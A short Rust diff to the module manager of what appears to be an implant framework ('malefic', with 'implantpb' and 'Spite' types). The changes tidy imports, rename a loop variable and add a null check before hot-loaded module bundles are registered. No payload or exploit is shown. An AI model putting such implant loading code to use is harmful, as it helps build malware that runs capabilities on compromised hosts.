@@ -1,13 +1,10 @@
-
 #![allow(improper_ctypes_definitions)]
 use std::collections::HashMap;
-use malefic_helper::debug;
+
 use malefic_proto::new_spite;
 use malefic_proto::proto::implantpb::Spite;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::Addon;
-use malefic_modules::{check_field, MaleficBundle, MaleficModule};
-
+use malefic_modules::prelude::*;
 use crate::check_body;
 use crate::common::error::MaleficError;
 use crate::manager::addons::{AddonMap, MaleficAddon};
@@ -52,9 +49,9 @@ impl MaleficManager{
 
     pub fn reload(&mut self) -> Result<(), MaleficError> {
         self.modules.clear();
-        for (name, bundle) in self.bundles.iter() {
+        for (_name, bundle) in self.bundles.iter() {
             let bundle_modules = bundle();
-            debug!("refresh module: {} {:?}", name, bundle_modules.keys());
+            debug!("refresh module: {} {:?}", _name, bundle_modules.keys());
             for (module_name, module) in bundle_modules {
                 self.modules.insert(module_name.to_string(), module);
             }
@@ -76,6 +73,9 @@ impl MaleficManager{
                 let ret = malefic_helper::common::hot_modules::call_fresh_modules(bundle as _)
                     .ok_or_else(|| MaleficError::ModuleError)?;
 
+                if ret.is_null() {
+                    return Err(MaleficError::ModuleError);
+                }
                 let register_func: ModuleRegister = core::mem::transmute(ret);
                 self.bundles.insert(bundle_name.to_string(), register_func);
                 
